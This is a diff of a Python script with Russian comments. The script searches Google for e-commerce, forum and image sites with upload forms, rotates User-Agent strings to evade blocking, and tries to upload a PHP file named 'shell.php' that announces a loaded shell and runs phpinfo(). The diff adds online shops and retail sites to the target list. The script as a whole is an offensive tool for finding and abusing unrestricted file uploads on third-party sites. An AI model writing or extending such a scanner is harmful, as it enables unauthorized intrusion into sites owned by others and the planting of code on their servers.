@@ -8,7 +8,12 @@ from urllib.parse import urljoin
 # Готовим файл для теста
 payload_file = "shell.php"
 with open(payload_file, 'w') as f:
-    f.write("<?php phpinfo(); ?>")  # Простой PHP код для теста
+    f.write("""
+<?php 
+echo "Шелл загружен!"; 
+phpinfo();
+?>
+    """)  # Простой PHP код для теста
 
 # Список User-Agent'ов для обхода блокировок
 USER_AGENTS = [
@@ -32,7 +37,12 @@ themes = [
     "education upload",           # Образовательные ресурсы
     "image upload",               # Сайты для загрузки изображений
     "community upload",           # Сайты сообщества
-    "discussion upload"           # Обсуждения и форумы
+    "discussion upload",          # Обсуждения и форумы
+    "e-commerce upload",          # Интернет-магазины (e-commerce)
+    "online store upload",        # Онлайн магазины
+    "shop upload",                # Интернет-магазины с возможностью загрузки
+    "product upload",             # Магазины, где можно загружать изображения товаров
+    "retail upload",              # Розничные магазины с возможностью загрузки
 ]
 
 # Функция для отправки поискового запроса в Google
@@ -77,6 +87,7 @@ async def scan_for_file_upload(session, url):
 
     except Exception as e:
         print(f"Ошибка при обработке сайта {url}: {str(e)}")
+        return
 
 # Попытка загрузить PHP файл
 async def try_upload_file(session, action_url, payload_file):
